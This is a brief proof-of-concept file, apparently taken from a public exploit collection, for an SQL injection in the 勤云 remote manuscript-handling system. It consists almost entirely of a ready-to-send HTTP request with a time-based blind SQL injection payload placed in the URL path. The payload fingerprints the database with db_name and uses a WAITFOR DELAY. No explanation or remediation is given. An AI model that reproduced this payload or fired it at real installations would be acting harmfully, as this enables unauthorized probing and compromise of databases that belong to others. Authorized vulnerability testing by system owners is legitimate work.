# qygj_sqli

from: https://github.com/wy876/POC/blob/main/%E5%8C%97%E4%BA%AC%E5%8B%A4%E4%BA%91%E7%A7%91%E6%8A%80/%E5%8B%A4%E4%BA%91%E8%BF%9C%E7%A8%8B%E7%A8%BF%E4%BB%B6%E5%A4%84%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

product: 勤云远程稿件处理系统

```
GET /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:5'--/article/abstract/1 HTTP/1.1
Host: 
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```
